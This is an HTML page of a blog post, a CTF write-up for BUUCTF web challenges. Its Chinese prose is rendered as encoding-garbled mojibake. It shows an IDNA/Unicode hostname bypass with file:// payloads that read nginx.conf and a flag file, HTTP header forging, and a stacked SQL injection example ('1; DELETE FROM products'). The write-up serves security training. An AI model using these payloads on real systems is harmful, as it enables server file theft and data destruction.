<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><!--!--><title>BUUCTF-webåˆ·é¢˜â…¡ - ggb0n&#039;s Blog</title><meta description="åˆ·é¢˜åˆ·ä¸åœï¼Œç»§ç»­åˆ·ï¼ğŸ‘¾ğŸ‘¾ğŸ‘¾"><meta property="og:type" content="article"><meta property="og:title" content="BUUCTF-webåˆ·é¢˜â…¡"><meta property="og:url" content="http://ggb0n.cool/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/"><meta property="og:site_name" content="ggb0n&#039;s blog"><meta property="og:description" content="åˆ·é¢˜åˆ·ä¸åœï¼Œç»§ç»­åˆ·ï¼ğŸ‘¾ğŸ‘¾ğŸ‘¾"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://ggb0n.cool/images/icon2.png"><meta property="article:published_time" content="2020-02-10T05:00:01.000Z"><meta property="article:modified_time" content="2020-04-16T07:44:17.638Z"><meta property="article:author" content="ggb0n"><meta property="article:tag" content="CTF"><meta property="article:tag" content="web"><meta property="article:tag" content="Cookieæ”»å‡»"><meta property="article:tag" content="SQLæ³¨å…¥"><meta property="article:tag" content="RCE"><meta property="article:tag" content="ååºåˆ—åŒ–æ¼æ´"><meta property="article:tag" content="æ–‡ä»¶ä¸Šä¼ "><meta property="article:tag" content="INDAæ¼æ´"><meta property="article:tag" content="HTTPè¯·æ±‚ä¼ªé€ "><meta property="article:tag" content="å †å æ³¨å…¥"><meta property="article:tag" content="PHPä¼ªåè®®"><meta property="article:tag" content="Pythonååºåˆ—åŒ–æ¼æ´"><meta property="article:tag" content="Unicodeå®‰å…¨é—®é¢˜"><meta property="article:tag" content="JWTä¼ªé€ "><meta property="article:tag" content="è–…ç¾Šæ¯›é€»è¾‘æ¼æ´"><meta property="article:tag" content="SSTIæ¨¡æ¿æ³¨å…¥"><meta property="article:tag" content="MD5å¼ºæ¯”è¾ƒ"><meta property="article:tag" content="æ— å‚æ•°RCE"><meta property="article:tag" content="open-basedirç»•è¿‡"><meta property="article:tag" content="htaccessä¸Šä¼ æ¼æ´"><meta property="article:tag" content="å·§å–webshell"><meta property="article:tag" content="bypass functions_disable"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://ggb0n.cool/images/icon2.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://ggb0n.cool/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/"},"headline":"BUUCTF-webåˆ·é¢˜â…¡","image":["http://www.ggb0n.cool/images/back2.png"],"datePublished":"2020-02-10T05:00:01.000Z","dateModified":"2020-04-16T07:44:17.638Z","author":{"@type":"Person","name":"ggb0n"},"description":"åˆ·é¢˜åˆ·ä¸åœï¼Œç»§ç»­åˆ·ï¼ğŸ‘¾ğŸ‘¾ğŸ‘¾"}</script><link rel="alternative" href="/atom.xml" title="ggb0n&#039;s Blog" type="application/atom+xml"><link rel="icon" href="http://www.ggb0n.cool/images/icon2.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><script src="/js/md5.min.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo1.png" alt="ggb0n&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">é¦–é¡µ</a><a class="navbar-item" href="/archives">å½’æ¡£</a><a class="navbar-item" href="/categories">åˆ†ç±»</a><a class="navbar-item" href="/tags">æ ‡ç­¾</a><a class="navbar-item" href="/friend">å‹é“¾</a><a class="navbar-item" href="/message">ç•™è¨€</a><a class="navbar-item" href="/about">å…³äº</a><a class="navbar-item" href="/tools">CyberChef</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="thumbnail" src="http://ggb0n.cool/images/buuctf-top.png" alt="BUUCTF-webåˆ·é¢˜â…¡"></span></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-02-10T05:00:01.000Z">2020-02-10</time><a class="commentCountImg" href="/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/#comment-container"><span class="display-none-class">0bbf2509d2ebecfbaeffcd6931a678df</span><img class="not-gallery-item" src="/img/chat.svg">Â <span class="commentCount" id="0bbf2509d2ebecfbaeffcd6931a678df">Â 99+</span>Â Â Â Â </a><span class="level-item">an hour read (About 11822 words)</span><span class="level-item" id="busuanzi_container_page_pv"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="busuanzi_value_page_pv">0</span> visits</span></div></div><h1 class="title is-3 is-size-4-mobile">BUUCTF-webåˆ·é¢˜â…¡</h1><div class="content"><p>åˆ·é¢˜åˆ·ä¸åœï¼Œç»§ç»­åˆ·ï¼ğŸ‘¾ğŸ‘¾ğŸ‘¾<a id="more"></a></p>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><h3 id="è€ƒå¯ŸçŸ¥è¯†"><a href="#è€ƒå¯ŸçŸ¥è¯†" class="headerlink" title="è€ƒå¯ŸçŸ¥è¯†"></a>è€ƒå¯ŸçŸ¥è¯†</h3><p>è€ƒå¯ŸBlack Hat2019çš„ä¸€ä¸ªè®®é¢˜ï¼šåœ¨unicodeä¸­å­—ç¬¦â„€(U+2100)ï¼Œå½“åˆ©ç”¨<code>IDNA</code>å¤„ç†æ­¤å­—ç¬¦æ—¶ï¼Œä¼šå°†â„€å˜æˆa/cï¼Œå› æ­¤å½“ä½ è®¿é—®æ­¤urlæ—¶ï¼ŒdnsæœåŠ¡å™¨ä¼šè‡ªåŠ¨å°†urlé‡å®šå‘åˆ°å¦ä¸€ä¸ªç½‘ç«™ã€‚å¦‚æœæœåŠ¡å™¨å¼•ç”¨å‰ç«¯urlæ—¶ï¼Œåªå¯¹åŸŸååšäº†é™åˆ¶ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ¾ç»•è¿‡æœåŠ¡å™¨å¯¹åŸŸåçš„é™åˆ¶ã€‚<br>å…³äº<code>INDA</code>å’Œ<code>UIF-8</code>çš„æ¼æ´ï¼š<a href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html</a><br>æ­¤ç±»çš„å­—ç¬¦è¿˜æœ‰ï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">U+<span class="number">2100</span>, â„€</span><br><span class="line">U+<span class="number">2101</span>, â„</span><br><span class="line">U+<span class="number">2105</span>, â„…</span><br><span class="line">U+<span class="number">2106</span>, â„†</span><br><span class="line">U+FF0F, ï¼</span><br><span class="line">U+<span class="number">2047</span>, â‡</span><br><span class="line">U+<span class="number">2048</span>, âˆ</span><br><span class="line">U+<span class="number">2049</span>, â‰</span><br><span class="line">U+FE16,ï¸–</span><br><span class="line">U+FE56, ï¹–</span><br><span class="line">U+FF1F, ï¼Ÿ</span><br><span class="line">U+FE5F, ï¹Ÿ</span><br><span class="line">U+FF03, ï¼ƒ</span><br><span class="line">U+FE6B, ï¹«</span><br><span class="line">U+FF20, ï¼ </span><br><span class="line">ç›¸ä¿¡æ€»ä¼šç”¨åˆ°çš„</span><br></pre></td></tr></table></figure>
<p>å‚è€ƒBlack Hat2019çš„PPTï¼š<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ï¼Œç»™äº†å¦‚ä¸‹çš„æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Blueprint, request, Response, escape ,render_template</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit, unquote</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Index</span></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">app_index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 333"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çœ‹åˆ°<code>getUrl()</code>ä¼šå¯¹ä¼ å…¥çš„<code>url</code>åšå¤šå±‚å¤„ç†å’Œè¿‡æ»¤ï¼š<br>ç¬¬ä¸€å±‚å¤„ç†åŠè¿‡æ»¤ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">host = parse.urlparse(url).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 111"</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œ<code>host = parse.urlparse(url).hostname</code>è¿”å›ä¼ å…¥çš„<code>url</code>çš„ä¸»æœºåï¼Œè¿™é‡Œ<code>urlparse</code>æ˜¯å°†<code>url</code>å­—ç¬¦ä¸²æ‹†åˆ†ä¸ºç»„ä»¶ï¼Œå¯å‚è€ƒï¼š<a href="https://www.cnblogs.com/jiumo/p/11143741.html">https://www.cnblogs.com/jiumo/p/11143741.html</a><br>åœ¨æœ¬æœºæµ‹è¯•æ•ˆæœå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">'http://www.baidu.com/index.php'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">'http://www.baidu.com/index.php'</span>).hostname</span><br><span class="line"><span class="string">'www.baidu.com'</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä¸ä¼šå¯¹<code>url</code>ä¸­çš„ç±»ä¼¼äº<code>â„€</code>çš„å­—ç¬¦åšå¤„ç†ï¼Œæµ‹è¯•æ•ˆæœï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">'http://www.baidu.â„€om/index.php'</span>).hostname</span><br><span class="line"><span class="string">'www.baidu.â„€om'</span></span><br></pre></td></tr></table></figure>
<p>å› æ­¤å€ŸåŠ©<code>INDA</code>æ¼æ´æ„é€ çš„<code>url</code>å¯ä»¥é€šè¿‡è¿™ä¸€æ­¥çš„è¿‡æ»¤ã€‚<br>ç¬¬äºŒå±‚å¤„ç†åŠè¿‡æ»¤ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parts = <span class="keyword">list</span>(urlsplit(url))</span><br><span class="line">host = parts[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 222 "</span> + host</span><br></pre></td></tr></table></figure>
<p><code>urlsplit</code>æ˜¯å°†<code>url</code>è¿›è¡Œåˆ†å‰²ï¼Œæµ‹è¯•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlsplit(<span class="string">'http://www.baidu.com/index.php'</span>)</span><br><span class="line">SplitResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlsplit(<span class="string">'http://www.baidu.com/index.php'</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="string">'www.baidu.com'</span></span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„åˆ©ç”¨äº†ä¸€ä¸ª<a href="https://link.zhihu.com/?target=https%3A//bugs.python.org/issue36216">CVE</a>ï¼š<strong>urlsplitä¸å¤„ç† NFKC æ ‡å‡†åŒ–</strong>(ç”¨ Punycode/IDNAç¼–ç çš„URLä½¿ç”¨NFKCè§„èŒƒåŒ–æ¥åˆ†è§£å­—ç¬¦)ï¼Œå› æ­¤å¯¹<code>â„€</code>ç±»çš„å­—ç¬¦ä¹Ÿæ˜¯å¤„ç†ä¸äº†çš„ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlsplit(<span class="string">'http://www.baidu.â„€om/index.php'</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="string">'www.baidu.â„€om'</span></span><br></pre></td></tr></table></figure>
<p>ç»•è¿‡å‰ä¸¤å±‚è¿‡æ»¤ï¼Œåˆ°ç¬¬ä¸‰å±‚å¤„ç†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">newhost = []</span><br><span class="line"><span class="keyword">for</span> h in host.split(<span class="string">'.'</span>):</span><br><span class="line">    newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å‘ç°ï¼Œè¿™é‡Œæ˜¯åœ¨<code>url</code>çš„<code>.</code>å¤„è¿›è¡Œåˆ†å‰²ï¼Œå¹¶åŠ å…¥åˆ°<code>newhost[]</code>æ•°ç»„ä¸­ï¼Œä½†æ˜¯åŠ å…¥æ•°ç»„ä¹‹å‰ä¼šç»§ç»­<code>INDA</code>ç¼–ç ç„¶å<code>UTF-8</code>è§£ç ï¼Œé‚£ä¹ˆåœ¨æ­¤å¤„<code>â„€</code>ç±»çš„å­—ç¬¦ä¾¿ä¼šè¢«è§£æä¸º<code>a/c</code>ï¼Œæˆ‘ä»¬åˆ©ç”¨æ­¤æ¼æ´ä¾¿å¯ä»¥æ„é€ èƒ½æ‰“å…¥æœåŠ¡å™¨æ‹¿flagçš„payloadäº†ã€‚</p>
<h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æˆ‘ä»¬ä»å‰é¢çš„ä»£ç çœ‹åˆ°ï¼Œæ„é€ çš„<code>url</code>çš„åŸŸåéœ€è¦ç»•è¿‡å‰ä¸¤å±‚<code>host == &#39;suctf.cc&#39;</code>çš„åˆ¤æ–­ï¼Œå¹¶ä¸”è¦æ»¡è¶³ç¬¬ä¸‰å±‚çš„<code>host == &#39;suctf.cc&#39;</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥æ„é€ åŸŸåï¼š<code>suctf.câ„†sr</code>ä¾¿å¯ä»¥ç»•è¿‡å¯¹åŸŸåçš„åˆ¤æ–­ã€‚<br>ä½†æ˜¯ç°åœ¨æˆ‘ä»¬ä¸çŸ¥é“flagæ–‡ä»¶åœ¨å“ªï¼Œä½†æ˜¯é¢˜ç›®ç»™äº†æç¤ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">&lt;!-- <span class="keyword">Do</span> you know the nginx? --&gt;</span><br></pre></td></tr></table></figure>
<p>æç¤ºæˆ‘ä»¬æ˜¯åŸºäº<code>nginx</code>æ¶æ„çš„æœåŠ¡å™¨ï¼Œé‚£è‚¯å®šä¸å…¶é…ç½®æ–‡ä»¶ç›¸å…³<br>è¿™é‡Œè¡¥å……çŸ¥è¯†ï¼š</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">Nginxé‡è¦æ–‡ä»¶ä½ç½®:</span><br><span class="line">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">ä¸»é…ç½®æ–‡ä»¶ï¼š<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">ç®¡ç†è„šæœ¬ï¼š<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">æ¨¡å—ï¼š<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">åº”ç”¨ç¨‹åºï¼š<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="meta-keyword">/var/</span>log/nginx</span><br><span class="line">é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š<span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/nginx/</span>conf/nginx.conf</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬è¯»å–<code>nignx.conf</code>åº”è¯¥èƒ½æ‰¾åˆ°flagæ–‡ä»¶çš„ä½ç½®ï¼Œæ„é€ payloadï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">file:<span class="regexp">//</span>suctf.câ„†sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨<code>file</code>åè®®è¯»å–<code>nginx.conf</code>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123; <span class="attribute">listen</span> <span class="number">80</span>; <span class="attribute">location</span> / &#123; <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>; &#125; <span class="attribute">location</span> <span class="variable">@app</span> &#123; <span class="attribute">include</span> uwsgi_params; <span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock; &#125; <span class="attribute">location</span> /static &#123; <span class="attribute">alias</span> /app/static; &#125; <span class="comment"># location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span></span><br></pre></td></tr></table></figure>
<p>æ‹¿åˆ°flagæ–‡ä»¶çš„ä½ç½®ä¹‹åï¼Œæ„é€ æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/getUrl?url=file://suctf.<span class="keyword">c</span><span class="symbol">%E2</span><span class="symbol">%84</span><span class="symbol">%86</span>sr/fffffflag</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ³¨æ„<code>â„†</code>éœ€è¦è¿›è¡Œurlç¼–ç ã€‚</p>
<p>æ‹“å±•ä¸€ä¸‹ï¼špythonçš„<code>urlsplit</code>å‡½æ•°å…¶å®æ˜¯æ¯”è¾ƒä¸å®Œå–„çš„ï¼Œè¿˜å­˜åœ¨<a href="https://link.zhihu.com/?target=https%3A//bugs.python.org/issue36742">urlsplit NFKD æ ‡å‡†åŒ–æ¼æ´</a>ï¼Œä»¥åé‡åˆ°çš„æ—¶å€™éœ€è¦å¤šåŠ æ³¨æ„ã€‚</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>è€ƒå¯Ÿ<code>http</code>åè®®çš„é¢˜ç›®ï¼Œå¸¸è§ä¹Ÿç®€å•ã€‚</p>
<h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æŸ¥çœ‹æºç å‘ç°ä¸€ä¸ª<code>Secret.php</code>çš„é“¾æ¥ï¼Œè¿›å»ä¹‹åæç¤ºï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web28.png" alt=""><br>ä¼ªé€ <code>Refer</code>å¤´å³å¯ï¼Œä¼ªé€ ä¹‹ååˆæç¤ºï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web29.png" alt=""><br>ä¼ªé€ <code>UA</code>å¤´å³å¯ï¼Œç„¶åæç¤ºéœ€è¦æ¥è‡ªæœ¬åœ°ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web30.png" alt=""><br>ä¼ªé€ <code>IP</code>å³å¯æ‹¿åˆ°flag<br><img src="http://www.ggb0n.cool/images/BUUCTF-web31.png" alt=""><br>è¿™ä¸ªåœ°æ–¹å¯ä»¥ä¼ªé€ å¤šå¤„ï¼Œå¯ä»¥ä¼ªé€ <code>x-forwarded-for</code>ä¹Ÿå¯ä»¥ä¼ªé€ <code>client-ip</code>ï¼Œè¿˜å¯ä»¥ä¼ªé€ <code>host</code>å¤´ï¼Œæœ‰äº›æ—¶å€™ç”šè‡³æŠŠä¸‰ä¸ªéƒ½ä¼ªé€ ä¸Šï¼Œä¹‹å‰æ‰“æ¯”èµ›é‡åˆ°ä¸€ä¸ªé¢˜ç›®å°±æ˜¯ï¼Œå·¨å‘â€¦</p>
<p>ä¼ªé€ åè®®å¤´å¯ä»¥é€šè¿‡BPæŠ“åŒ…æ”¹åŒ…ï¼Œå½“ç„¶æœ‰æ›´æ–¹ä¾¿çš„æ–¹æ³•ï¼Œè¿™é‡Œæ¨èä¸€ä¸ªç«ç‹/è°·æ­Œçš„æ’ä»¶<code>Header Editor</code>æ–¹ä¾¿å¥½ç”¨ã€‚</p>
<h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>è€ƒå¯Ÿå †å æ³¨å…¥<br>æ³¨å…¥åŸç†ï¼š<br>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿç­”æ¡ˆæ˜¯ä¼šçš„ï¼Œè¿™ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´åŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·è¾“å…¥ï¼š1; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„<span class="keyword">sql</span>è¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰<span class="keyword">Select</span> * <span class="keyword">from</span> products <span class="keyword">where</span> productid=<span class="number">1</span>;<span class="keyword">DELETE</span> <span class="keyword">FROM</span> productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</span><br></pre></td></tr></table></figure>
